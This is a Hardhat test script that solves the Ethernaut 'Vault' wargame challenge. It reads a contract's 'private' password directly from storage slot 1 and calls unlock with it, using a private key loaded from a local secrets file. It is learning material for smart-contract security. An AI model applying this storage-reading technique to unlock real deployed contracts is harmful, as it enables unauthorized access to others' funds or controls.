import { Force__factory, ForcePushEth__factory, Vault__factory } from "typechain-types"
import * as hardhat from "hardhat"
import { ethers } from "hardhat"
import path from "path"
import os from "os"
import * as dotenv from "dotenv"
import { BigNumber, BytesLike, Wallet } from "ethers"

const { expect } = require("chai")

const settings = dotenv.config({ path: path.join(os.homedir(), ".secrets", "ethernaut.env") }).parsed!!

/**
 * Returns an Ethereum function selector given the function signature
 * @param functionSignature The name of the function (and its arguments in parens)
 */
function ethereumFunctionSelector(functionSignature: string): BytesLike {
  const functionSignatureAsUtf8Bytes = hardhat.ethers.utils.toUtf8Bytes(functionSignature)
  const signatureCksum = ethers.utils.keccak256(functionSignatureAsUtf8Bytes)
  // end is 10 because we want the first four bytes (8 characters), and
  // signatureCksum starts with 0x (two characters).  arrayify expects
  // what ethers calls a DataHexStringOrArrayish https://docs.ethers.org/v5/api/utils/bytes/
  // which is something like 0xdd365b8b
  const firstFourBytesOfChecksum = signatureCksum.slice(0, 10)
  const result = hardhat.ethers.utils.arrayify(firstFourBytesOfChecksum)
  return result
}

describe("ethernaut", function() {
  it("should do the ethernaut challenge", async function() {
    const [initialDeployer] = await hardhat.ethers.getSigners()

    const mySigner = new Wallet(settings["privatekey"], hardhat.ethers.provider)

    let signatureString = hardhat.ethers.utils.formatBytes32String("0xaabb")
    const signature = hardhat.ethers.utils.arrayify(signatureString)
    // const vaultContract = await new Vault__factory(mySigner).deploy(signature)
    const vaultContract = Vault__factory.connect(settings["instanceAddr"], mySigner)
    const badlyHiddenSignature = await hardhat.ethers.provider.getStorageAt(vaultContract.address, 1)
    await vaultContract.unlock(badlyHiddenSignature).then(x => x.wait())

    expect(badlyHiddenSignature.toString()).to.eql(signatureString)
  })
})